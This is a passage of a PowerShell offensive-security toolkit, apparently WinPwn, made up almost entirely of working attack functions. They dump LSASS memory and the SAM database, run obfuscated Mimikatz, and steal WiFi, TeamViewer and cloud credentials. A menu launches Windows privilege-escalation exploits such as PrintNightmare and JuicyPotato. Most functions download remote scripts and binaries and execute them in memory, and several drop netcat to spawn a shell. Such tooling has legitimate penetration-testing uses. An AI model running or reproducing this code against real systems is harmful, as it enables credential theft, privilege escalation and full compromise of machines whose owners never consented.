    {
        Invoke-NanoDump -valid
    }
    else
    {
        Invoke-NanoDump
    }
}

function werDump
{
  <#
        .DESCRIPTION
        Dump lsass via wer, credit goes to https://twitter.com/JohnLaTwC/status/1411345380407578624
        Author: @S3cur3Th1sSh1t
    #>
    Write-Host "Dumping to C:\windows\temp\dump.txt"
    $WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting');$WERNativeMethods = $WER.GetNestedType('NativeMethods', 'NonPublic');$Flags = [Reflection.BindingFlags] 'NonPublic, Static';$MiniDumpWriteDump = $WERNativeMethods.GetMethod('MiniDumpWriteDump', $Flags);$ProcessDumpPath = 'C:\windows\temp\dump.txt';$FileStream = New-Object IO.FileStream($ProcessDumpPath, [IO.FileMode]::Create);$p=Get-Process lsass;$Result = $MiniDumpWriteDump.Invoke($null, @($p.Handle,$p.Id,$FileStream.SafeFileHandle,[UInt32] 2,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero));$FileStream.Close()
    if (test-Path "C:\windows\temp\dump.txt")
    {
        Write-Host "Lsass dump success: " $Result
    }

}

function HandleKatz
{
  <#
        .DESCRIPTION
        Dump lsass, credit goes to https://github.com/codewhitesec/HandleKatz, @thefLinkk
        Author: @S3cur3Th1sSh1t
    #>
     param(
        [switch]
        $noninteractive,
        [Switch]
        $consoleoutput
        )
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    if (isadmin)
    {
      $processes = Get-Process
      $dumpid = foreach ($process in $processes){if ($process.ProcessName -eq "lsass"){$process.id}}
      
      iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/Invoke-Handlekatz.ps1')
      
      Write-Host "Trying to dump the ID: $dumpid"
      Sleep 2

      Invoke-HandleKatz -handProcID $dumpid
      
      Write-Host "The dump via HandleKatz is obfuscated to avoid lsass dump detections on disk. To decode it you can/should use the following: https://github.com/codewhitesec/HandleKatz/blob/main/Decoder.py"
    }
    else{Write-Host "No Admin rights, start again using a privileged session!"}
}

function Decryptteamviewer
{
  param(
        [switch]
        $noninteractive,
        [Switch]
        $consoleoutput
        )
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    if(!$consoleoutput){pathcheck}
    # Wrote this Script myself, credit goes to @whynotsecurity - https://whynotsecurity.com/blog/teamviewer/
    iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/TeamViewerDecrypt/master/TeamViewerDecrypt.ps1')
    if(!$consoleoutput){
        TeamviewerDecrypt >> $currentPath\Exploitation\TeamViewerPasswords.txt
        Get-Content $currentPath\Exploitation\TeamViewerPasswords.txt
        Start-Sleep 5
    }
    else{
        TeamviewerDecrypt
    }
}
function SharpCloud
{
  param(
        [switch]
        $noninteractive,
        [Switch]
        $consoleoutput
        )
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    if(!$consoleoutput){pathcheck}
    iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpCloud.ps1')
    if(!$consoleoutput){
        Invoke-SharpCloud -Command all >> $currentPath\Exploitation\CloudCreds.txt
        Get-Content $currentPath\Exploitation\CloudCreds.txt
        Start-Sleep 5
    }
    else{Invoke-SharpCloud -Command all}
}

function Safedump
{
  param(
        [switch]
        $noninteractive,
        [Switch]
        $consoleoutput
        )
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    if(!$consoleoutput){pathcheck}
    blocketw
    iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Invoke-Sharpcradle/master/Invoke-Sharpcradle.ps1')
    
	if ($S3cur3Th1sSh1t_repo -eq "https://raw.githubusercontent.com/S3cur3Th1sSh1t")
	{
		Invoke-Sharpcradle -uri https://github.com/S3cur3Th1sSh1t/Creds/blob/master/Ghostpack/SafetyKatz.exe?raw=true
	}
	else
	{
		Invoke-Sharpcradle -uri $S3cur3Th1sSh1t_repo/Creds/master/Ghostpack/SafetyKatz.exe
	}
}
    
function Obfuskittiedump
{
  param(
        [switch]
        $noninteractive,
        [Switch]
        $consoleoutput
        )
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    if(!$consoleoutput){pathcheck}
    IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/mimi.ps1')
    Write-Host -ForegroundColor Yellow "Dumping Credentials output goes to .\Exploitation\Credentials.txt"
    if(!$consoleoutput){
        Invoke-TheKatz >> $currentPath\Exploitation\Credentials.txt
        Get-Content $currentPath\Exploitation\Credentials.txt
        Start-Sleep -Seconds 5
    }else{Invoke-TheKatz}
}
function Wificreds
{
  param(
        [switch]
        $noninteractive,
        [Switch]
        $consoleoutput
        )
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    if(!$consoleoutput){pathcheck}
    IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/Get-WLAN-Keys.ps1')
    Write-Host "Saving to .\Exploitation\WIFI_Keys.txt"
    if(!$consoleoutput){
        Get-WLAN-Keys >> $currentPath\Exploitation\WIFI_Keys.txt
        Get-Content $currentPath\Exploitation\WIFI_Keys.txt
        Start-Sleep -Seconds 5
    }else{Get-WLAN-Keys}
}
    
function Kittenz
{
  param(
        [switch]
        $noninteractive,
        [Switch]
        $consoleoutput
        )
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    if(!$consoleoutput){pathcheck}
    IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/obfuskittie.ps1')
    Write-Host -ForegroundColor Yellow 'Running the small kittie, output to .\Exploitation\kittenz.txt'
    if(!$consoleoutput){
        inbox | out-string -Width 5000 >> $currentPath\Exploitation\kittenz.txt
        Get-Content $currentPath\Exploitation\kittenz.txt
        Start-Sleep -Seconds 5
    }else{inbox | out-string -Width 5000}
}
    
function Samfile
{
  param(
        [switch]
        $noninteractive,
        [Switch]
        $consoleoutput
        )
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    if(!$consoleoutput){pathcheck}
    iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/Invoke-PowerDump.ps1')
    Write-Host "Dumping SAM, output to .\Exploitation\SAMDump.txt"
    if(!$consoleoutput){
        Invoke-PowerDump >> $currentPath\Exploitation\SAMDump.txt
        Get-Content $currentPath\Exploitation\SAMDump.txt
        Start-Sleep -Seconds 5
    }else{Invoke-PowerDump}
}

function Dumplsass
{
  <#
        .DESCRIPTION
        Dump lsass, credit goes to https://modexp.wordpress.com/2019/08/30/minidumpwritedump-via-com-services-dll/
        Author: @S3cur3Th1sSh1t
        License: BSD 3-Clause
    #>
     param(
        [switch]
        $noninteractive,
        [Switch]
        $consoleoutput
        )
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    if (isadmin)
    {
      try{
      $processes = Get-Process
      $dumpid = foreach ($process in $processes){if ($process.ProcessName -eq "lsass"){$process.id}}
      Write-Host "Found lsass process with ID $dumpid - starting dump with rundll32"
      if(!$consoleoutput){
            Write-Host "Dumpfile goes to .\Exploitation\$env:computername.log "
          rundll32 C:\Windows\System32\comsvcs.dll, MiniDump $dumpid $currentPath\Exploitation\$env:computername.log full
        }
        else{
            Write-Host "Dumpfile goes to C:\windows\temp\$env:computername.log "
            rundll32 C:\Windows\System32\comsvcs.dll, MiniDump $dumpid C:\windows\temp\$env:computername.log full
        }
    }
    catch{
      Write-Host "Something went wrong, using safetykatz instead"
                 iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/SafetyDump.ps1')
                 if(!$consoleoutput){
                    Write-Host -ForegroundColor Yellow 'Dumping lsass to .\Exploitation\debug.bin :'
                    Safetydump
                move C:\windows\temp\debug.bin $currentPath\Exploitation\debug.bin
                }
                else
                {
                    Write-Host -ForegroundColor Yellow 'Dumping lsass to C:\windows\temp\debug.bin :'
                    Safetydump
                }
      }
    }
    else{Write-Host "No Admin rights, start again using a privileged session!"}
}

function Kernelexploits
{
  <#
        .DESCRIPTION
        Get a SYSTEM Shell using Kernel exploits. Most binaries are the original poc exploits loaded via Invoke-Refl3ctiv3Pe!njection + obfuscated afterwards for @msi bypass
        Author: @S3cur3Th1sSh1t
        License: BSD 3-Clause
    #>
    #Exploitation
    pathcheck
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    @'

             
__        ___       ____                 
\ \      / (_)_ __ |  _ \__      ___ __  
 \ \ /\ / /| | '_ \| |_) \ \ /\ / | '_ \ 
  \ V  V / | | | | |  __/ \ V  V /| | | |
   \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_|

   --> Get System @S3cur3Th1sSh1t

'@
        
    do
    {
        Write-Host "================ WinPwn ================"
      Write-Host -ForegroundColor Green '1. MS15-077 - (XP/Vista/Win7/Win8/2000/2003/2008/2012) x86 only!'
      Write-Host -ForegroundColor Green '2. MS16-032 - (2008/7/8/10/2012)!'
        Write-Host -ForegroundColor Green '3. MS16-135 - (WS2k16 only)! '
        Write-Host -ForegroundColor Green '4. CVE-2018-8120 - May 2018, Windows 7 SP1/2008 SP2,2008 R2 SP1! '
        Write-Host -ForegroundColor Green '5. CVE-2019-0841 - April 2019!'
        Write-Host -ForegroundColor Green '6. CVE-2019-1069 - Polarbear Hardlink, Credentials needed - June 2019! '
        Write-Host -ForegroundColor Green '7. CVE-2019-1129/1130 - Race Condition, multiples cores needed - July 2019! '
      Write-Host -ForegroundColor Green '8. CVE-2019-1215 - September 2019 - x64 only! '
      Write-Host -ForegroundColor Green '9. CVE-2020-0683 - February 2020 - x64 only! '
        Write-Host -ForegroundColor Green '10. CVE-2020-0796 - March 2020 - SMBGhost only SMBV3 with compression - no bind shell! '
      Write-Host -ForegroundColor Green '11. CVE-2020-0787 - March 2020 - all windows versions - BITSArbitraryFileMove ! '
        Write-Host -ForegroundColor Green '12. PrintNightmare - CVE-2021-34527/CVE-2021-1675 - June 2021 - All Windows versions running the Spooler Service!'
        Write-Host -ForegroundColor Green '13. CallbackHell - CVE-2021-40449 - October 2021 - Win7, Win8, Win10 (some builts), Server 2008/R2, Server 2012/R2, Server 2016/2019(some builts) - https://github.com/ly4k/CallbackHell - Pop CMD default shellcode!'
        Write-Host -ForegroundColor Green '14. Juicy-Potato Exploit from SeImpersonate or SeAssignPrimaryToken to SYSTEM!'
        Write-Host -ForegroundColor Green '15. PrintSpoofer - Abusing Impersonation Privileges on Windows 10 and Server 2019!'
        Write-Host -ForegroundColor Green '16. Go back '
        Write-Host "================ WinPwn ================"
        $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'

        Switch ($masterquestion) 
        {
          1{ms15-077}
          2{ms16-32}
          3{ms16-135}
          4{CVE-2018-8120}
          5{CVE-2019-0841}
          6{cve-2019-1069}
          7{CVE-2019-1129}
          8{CVE-2019-1215}
          9{CVE-2020-0683-lpe}
          10{cve-2020-0796}
          11{cve-2020-0787-lpe}
          12{PrintNightmare}
          13{CVE-2021-40449-exp}
          14{juicypot}
            15{printspoofer}
        }
    }
    While ($masterquestion -ne 16)

}

function testtemp
{
  if(!(Test-Path -Path C:\temp\))
  {
    mkdir C:\temp
  }
}

function PrintNightmare
{
    $DriverName = -join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_})
    iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/Invoke-PrintNightmare.ps1')
    Invoke-Nightmare -DriverName $DriverName
}

function CVE-2021-40449-exp
{
    iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/CVE-2021-40449.ps1')
    CVE-2021-40449
}

function cve-2020-0796
{
    iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/cve-2020-0796-lpe.ps1')
    cve-2020-0796-lpe
}

function cve-2020-0787-lpe
{
  iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/cve-2020-0787.ps1')
  cve-2020-0787
}

function printspoofer
{
    iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/printspoof_interactive.ps1')
    printspoof
}

function CVE-2020-0683-lpe
{
    if ([Environment]::Is64BitProcess)
    {
        iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/cve-2020-0683.ps1')
      CVE-2020-0683
    }
    else
    {
        Write-Host "Only x64, Sorry"
    }
}

function CVE-2019-1215
{
    testtemp
    
    if ($S3cur3Th1sSh1t_repo -eq "https://raw.githubusercontent.com/S3cur3Th1sSh1t")
	{
		Invoke-WebRequest -Uri 'https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/nc.exe' -Outfile C:\temp\nc.exe
	}
	else
	{
		Invoke-WebRequest -Uri ($S3cur3Th1sSh1t_repo + '/Creds/master/exeFiles/winexploits/nc.exe') -Outfile C:\temp\nc.exe
	}
    if ([Environment]::Is64BitProcess)
    {
        iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/cve-2019-1215.ps1')
    }
    else
    {
        Write-Host "Only x64, Sorry"
    }

}

function ms15-077
{
    testtemp
    
    if ($S3cur3Th1sSh1t_repo -eq "https://raw.githubusercontent.com/S3cur3Th1sSh1t")
	{
		Invoke-WebRequest -Uri 'https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/nc.exe' -Outfile C:\temp\nc.exe
	}
	else
	{
		Invoke-WebRequest -Uri ($S3cur3Th1sSh1t_repo + '/Creds/master/exeFiles/winexploits/nc.exe') -Outfile C:\temp\nc.exe
	}
    if ([Environment]::Is64BitProcess)
    {
        Write-Host "Only x86, Sorry"
    Start-Sleep -Seconds 3
    }
    else
    {
        iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/m15-077.ps1')
    MS15-077 -command "C:\temp\nc.exe 127.0.0.1 4444"
    Start-Sleep -Seconds 3
    cmd /c start powershell -Command {C:\temp\nc.exe 127.0.0.1 4444}
    }
    

}
function Juicypot
{
    testtemp
    if ($S3cur3Th1sSh1t_repo -eq "https://raw.githubusercontent.com/S3cur3Th1sSh1t")
	{
		Invoke-WebRequest -Uri 'https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/nc.exe' -Outfile C:\temp\nc.exe
	}
	else
	{
		Invoke-WebRequest -Uri ($S3cur3Th1sSh1t_repo + '/Creds/master/exeFiles/winexploits/nc.exe') -Outfile C:\temp\nc.exe
	}
    if ([Environment]::Is64BitProcess)
    {
        iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/juicypotato64.ps1')
        Invoke-JuicyPotato -Command "C:\temp\nc.exe 127.0.0.1 4444 -e cmd.exe"
    }
    else
    {
        iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/invoke-juicypotato.ps1')
        Invoke-JuicyPotato -Command "C:\temp\nc.exe 127.0.0.1 4444 -e cmd.exe"
    }
    Start-Sleep -Seconds 3
    cmd /c start powershell -Command {C:\temp\nc.exe 127.0.0.1 4444}
}

function CVE-2018-8120
{
    testtemp
    if ($S3cur3Th1sSh1t_repo -eq "https://raw.githubusercontent.com/S3cur3Th1sSh1t")
	{
		Invoke-WebRequest -Uri 'https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/nc.exe' -Outfile C:\temp\nc.exe
	}
	else
	{
		Invoke-WebRequest -Uri ($S3cur3Th1sSh1t_repo + '/Creds/master/exeFiles/winexploits/nc.exe') -Outfile C:\temp\nc.exe
	}
    iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/cve-2018-8120.ps1')
    cve-2018-8120 -command "C:\temp\nc.exe 127.0.0.1 4444"
    Start-Sleep -Seconds 3
    cmd /c start powershell -Command {C:\temp\nc.exe 127.0.0.1 4444}
}

function CVE-2019-0841
{
    testtemp
    iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Invoke-Sharpcradle/master/Invoke-Sharpcradle.ps1')
    
    if ($S3cur3Th1sSh1t_repo -eq "https://raw.githubusercontent.com/S3cur3Th1sSh1t")
	{
		Invoke-WebRequest -Uri 'https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/nc.exe' -Outfile C:\temp\nc.exe
		Invoke-Sharpcradle -uri "https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/privesc.exe" -argument1 license.rtf
	
	}
	else
	{
		Invoke-WebRequest -Uri ($S3cur3Th1sSh1t_repo + '/Creds/master/exeFiles/winexploits/nc.exe') -Outfile C:\temp\nc.exe
		Invoke-Sharpcradle -uri $S3cur3Th1sSh1t_repo + "/Creds/master/exeFiles/winexploits/privesc.exe" -argument1 license.rtf
	}
    Start-Sleep -Seconds 3
    cmd /c start powershell -Command {C:\temp\nc.exe 127.0.0.1 2000}
}
function CVE-2019-1129
{
	iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Invoke-Sharpcradle/master/Invoke-Sharpcradle.ps1')
	if ($S3cur3Th1sSh1t_repo -eq "https://raw.githubusercontent.com/S3cur3Th1sSh1t")
	{
		Invoke-Sharpcradle -uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/SharpByebear.exe -argument1 "license.rtf 2"
	}
	else
	{
		Invoke-Sharpcradle -uri $S3cur3Th1sSh1t_repo/Creds/raw/master/exeFiles/winexploits/SharpByebear.exe -argument1 "license.rtf 2"
	}
	Write-Host -ForegroundColor Yellow 'Click into the search bar on your lower left side'
	Start-Sleep -Seconds 15
	Write-Host 'Next Try..'
	if ($S3cur3Th1sSh1t_repo -eq "https://raw.githubusercontent.com/S3cur3Th1sSh1t")
	{
		Invoke-Sharpcradle -uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/SharpByebear.exe -argument1 "license.rtf 2"
	}
	else
	{
		Invoke-Sharpcradle -uri $S3cur3Th1sSh1t_repo/Creds/master/exeFiles/winexploits/SharpByebear.exe -argument1 "license.rtf 2"
	}
	Write-Host -ForegroundColor Yellow 'Click into the search bar on your lower left side'
	Start-Sleep -Seconds 15
}

function CVE-2019-1069
{
	blocketw
	iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Invoke-Sharpcradle/master/Invoke-Sharpcradle.ps1')
      $polaraction = Read-Host -Prompt 'Do you have a valid username and password for CVE-2019-1069?'
      if ($polaraction -eq "yes" -or $polaraction -eq "y" -or $polaraction -eq "Yes" -or $polaraction -eq "Y")
      {
        $username = Read-Host -Prompt 'Please enter the username'
        $password = Read-Host -Prompt 'Please enter the password'

		if ($S3cur3Th1sSh1t_repo -eq "https://raw.githubusercontent.com/S3cur3Th1sSh1t")
		{
			Invoke-Webrequest -Uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/schedsvc.dll -Outfile $currentPath\schedsvc.dll
			Invoke-Webrequest -Uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/schtasks.exe -Outfile $currentPath\schtasks.exe
			Invoke-Webrequest -Uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/test.job -Outfile $currentPath\test.job
		}
		else
		{
			Invoke-Webrequest -Uri $S3cur3Th1sSh1t_repo/Creds/master/exeFiles/winexploits/schedsvc.dll -Outfile $currentPath\schedsvc.dll
			Invoke-Webrequest -Uri $S3cur3Th1sSh1t_repo/Creds/master/exeFiles/winexploits/schtasks.exe -Outfile $currentPath\schtasks.exe
			Invoke-Webrequest -Uri $S3cur3Th1sSh1t_repo/Creds/master/exeFiles/winexploits/test.job -Outfile $currentPath\test.job
		}
		
        if ([Environment]::Is64BitProcess)
        {
   			if ($S3cur3Th1sSh1t_repo -eq "https://raw.githubusercontent.com/S3cur3Th1sSh1t")
			{
				Invoke-Sharpcradle -uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/SharpPolarbear.exe -argument1 license.rtf $username $password
				Start-Sleep -Seconds 1.5
				Invoke-Sharpcradle -uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/SharpPolarbear.exe -argument1 license.rtf $username $password
			}
			else
			{
				Invoke-Sharpcradle -uri $S3cur3Th1sSh1t_repo/Creds/master/exeFiles/winexploits/SharpPolarbear.exe -argument1 license.rtf $username $password
				Start-Sleep -Seconds 1.5
				Invoke-Sharpcradle -uri $S3cur3Th1sSh1t_repo/Creds/master/exeFiles/winexploits/SharpPolarbear.exe -argument1 license.rtf $username $password
			}
        }
        else
        {
			if ($S3cur3Th1sSh1t_repo -eq "https://raw.githubusercontent.com/S3cur3Th1sSh1t")
			{
				Invoke-Sharpcradle -uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/SharpPolarbearx86.exe -argument1 license.rtf $username $password
				Start-Sleep -Seconds 1.5
				Invoke-Sharpcradle -uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/SharpPolarbearx86.exe -argument1 license.rtf $username $password
			}
			else
			{
				Invoke-Sharpcradle -uri $S3cur3Th1sSh1t_repo/Creds/master/exeFiles/winexploits/SharpPolarbearx86.exe -argument1 license.rtf $username $password
				Start-Sleep -Seconds 1.5
				Invoke-Sharpcradle -uri $S3cur3Th1sSh1t_repo/Creds/master/exeFiles/winexploits/SharpPolarbearx86.exe -argument1 license.rtf $username $password
			}
        }
		
        move env:USERPROFILE\Appdata\Local\temp\license.rtf C:\windows\system32\license.rtf
        del .\schedsvc.dll
        del .\schtasks.exe
        del C:\windows\system32\tasks\test
      }
}

function ms16-32
{
    iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/ms16-32.ps1')
    Invoke-MS16-032
}

function ms16-135
{
    iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/ms16-135.ps1')
}

function Localreconmodules
{
  <#
        .DESCRIPTION
        All local recon scripts are executed here.
        Author: @S3cur3Th1sSh1t
        License: BSD 3-Clause
    #>
    #Local Reconning
    [CmdletBinding()]
    Param (
        [Switch]
        $consoleoutput,
        [Switch]
        $noninteractive   
    )
         
      
            
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    @'

             
__        ___       ____                 
\ \      / (_)_ __ |  _ \__      ___ __  
 \ \ /\ / /| | '_ \| |_) \ \ /\ / | '_ \ 
  \ V  V / | | | | |  __/ \ V  V /| | | |
   \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_|

   --> Localreconmodules

'@
    if ($noninteractive -and (!$consoleoutput))
    {
        generalrecon -noninteractive
        powershellsensitive -noninteractive
        browserpwn -noninteractive
        dotnet -noninteractive
        passhunt -local $true -noninteractive
        sessionGopher -noninteractive
        sensitivefiles -noninteractive
        return;
    }
    elseif ($noninteractive -and $consoleoutput)
    {
        generalrecon -noninteractive -consoleoutput
        powershellsensitive -noninteractive -consoleoutput
        browserpwn -noninteractive -consoleoutput
        dotnet -noninteractive -consoleoutput 
        sessionGopher -noninteractive -consoleoutput
        sensitivefiles -noninteractive -consoleoutput
        return;    
    }
    
    do
    {
        Write-Host "================ WinPwn ================"
        Write-Host -ForegroundColor Green '1. Collect general computer informations, this will take some time!'
        Write-Host -ForegroundColor Green '2. Check Powershell event logs for credentials or other sensitive information! '
        Write-Host -ForegroundColor Green '3. Collect Browser credentials as well as the history! '
        Write-Host -ForegroundColor Green '4. Search for .NET Service-Binaries on this system! '
        Write-Host -ForegroundColor Green '5. Search for Passwords on this system using passhunt.exe!'
        Write-Host -ForegroundColor Green '6. Start SessionGopher! '
        Write-Host -ForegroundColor Green '7. Search for sensitive files on this local system (config files, rdp files, password files and more)! '
        Write-Host -ForegroundColor Green '8. Execute PSRecon or Get-ComputerDetails (powersploit)! '
        Write-Host -ForegroundColor Green '9. Search for any .NET binary file in a share! '
	Write-Host -ForegroundColor Green '10. Search for vulnerable drivers (check against loldrivers.io)'
        Write-Host -ForegroundColor Green '11. Go back '
        Write-Host "================ WinPwn ================"
        $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'

        Switch ($masterquestion) 
        {
             1{generalrecon}
             2{powershellsensitive}
             3{browserpwn}
             4{dotnet}
             5{passhunt -local $true}
             6{sessiongopher}
             7{sensitivefiles}
             8{morerecon}
             9{dotnetsearch}
	     10{vulnerabledrivers}
       }
    }
  While ($masterquestion -ne 11)
}

function vulnerabledrivers
{

# Simple script to check drivers in C:\windows\system32\drivers against the loldrivers list
# Author: Oddvar Moe - @oddvar.moe

$drivers = get-childitem -Path c:\windows\system32\drivers
$web_client = new-object system.net.webclient
$loldrivers = $web_client.DownloadString("https://www.loldrivers.io/api/drivers.json") | ConvertFrom-Json

Write-output("Checking {0} drivers in C:\windows\system32\drivers against loldrivers.io json file" -f $drivers.Count)
foreach ($lol in $loldrivers.KnownVulnerableSamples)
{
    # Check for matching driver name
    if($drivers.Name -contains $lol.Filename)
    {
        #CHECK HASH
        $Hash = Get-FileHash -Path "c:\windows\system32\drivers\$($lol.Filename)"
        if($lol.Sha256 -eq $Hash.Hash)
        {
            write-output("The drivername {0} is vulnerable with a matching SHA256 hash of {1}" -f $lol.Filename, $lol.SHA256)
	    write-output("The drivername {0} is vulnerable with a matching SHA256 hash of {1}" -f $lol.Filename, $lol.SHA256) >> "$currentPath\Vulnerabilities\vulnerabledrivers.txt"
        }
    }
}

}

function Generalrecon{
    Param (
    [Switch]
    $consoleoutput,
    [Switch]
    $noninteractive   
  )
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName

    Write-Host -ForegroundColor Yellow 'Starting local Recon phase:'
    #Check for WSUS Updates over HTTP
  Write-Host -ForegroundColor Yellow 'Checking for WSUS over http'
    $UseWUServer = (Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" -Name UseWUServer -ErrorAction SilentlyContinue).UseWUServer
    $WUServer = (Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" -Name WUServer -ErrorAction SilentlyContinue).WUServer

    if($UseWUServer -eq 1 -and $WUServer.ToLower().StartsWith("http://")) 
  {
        Write-Host -ForegroundColor Yellow 'WSUS Server over HTTP detected, most likely all hosts in this domain can get fake-Updates!'
      if(!$consoleoutput){echo "Wsus over http detected! Fake Updates can be delivered here. $UseWUServer / $WUServer " >> "$currentPath\Vulnerabilities\WsusoverHTTP.txt"}else{echo "Wsus over http detected! Fake Updates can be delivered here. $UseWUServer / $WUServer "}
    }

    #Check for SMB Signing
    Write-Host -ForegroundColor Yellow 'Check SMB-Signing for the local system'
    iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/Invoke-SMBNegotiate.ps1')
    if(!$consoleoutput){Invoke-SMBNegotiate -ComputerName localhost >> "$currentPath\Vulnerabilities\SMBSigningState.txt"}else{Write-Host -ForegroundColor red "SMB Signing State: ";Invoke-SMBNegotiate -ComputerName localhost}


    #Check .NET Framework versions in use
    $Lookup = @{
    378389 = [version]'4.5'
    378675 = [version]'4.5.1'
    378758 = [version]'4.5.1'
    379893 = [version]'4.5.2'
    393295 = [version]'4.6'
    393297 = [version]'4.6'
    394254 = [version]'4.6.1'
    394271 = [version]'4.6.1'
    394802 = [version]'4.6.2'
    394806 = [version]'4.6.2'
    460798 = [version]'4.7'
    460805 = [version]'4.7'
    461308 = [version]'4.7.1'
    461310 = [version]'4.7.1'
    461808 = [version]'4.7.2'
    461814 = [version]'4.7.2'
    528040 = [version]'4.8'
    528049 = [version]'4.8'
    }

    $Versions = Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -Recurse |
  Get-ItemProperty -name Version, Release -EA 0 |
  Where-Object { $_.PSChildName -match '^(?!S)\p{L}'} |
  Select-Object @{name = ".NET Framework"; expression = {$_.PSChildName}}, 
  @{name = "Product"; expression = {$Lookup[$_.Release]}},Version, Release
    
    if(!$consoleoutput)
    {
        $Versions >> "$currentPath\LocalRecon\NetFrameworkVersionsInstalled.txt"
    }
    else
    {
        $Versions
    }

    #Collecting usefull Informations
    if(!$consoleoutput){
        Write-Host -ForegroundColor Yellow 'Collecting local system Informations for later lookup, saving them to .\LocalRecon\'
        systeminfo >> "$currentPath\LocalRecon\systeminfo.txt"
        Write-Host -ForegroundColor Yellow 'Getting Patches'
      wmic qfe >> "$currentPath\LocalRecon\Patches.txt"
        wmic os get osarchitecture >> "$currentPath\LocalRecon\Architecture.txt"
      Write-Host -ForegroundColor Yellow 'Getting environment variables'
        Get-ChildItem Env: | ft Key,Value >> "$currentPath\LocalRecon\Environmentvariables.txt"
      Write-Host -ForegroundColor Yellow 'Getting connected drives'
        Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root >> "$currentPath\LocalRecon\Drives.txt"
        Write-Host -ForegroundColor Yellow 'Getting current user Privileges'
      whoami /priv >> "$currentPath\LocalRecon\Privileges.txt"
        Get-LocalUser | ft Name,Enabled,LastLogon >> "$currentPath\LocalRecon\LocalUsers.txt"
        Write-Host -ForegroundColor Yellow 'Getting local Accounts/Users + Password policy'
      net accounts >>  "$currentPath\LocalRecon\PasswordPolicy.txt"
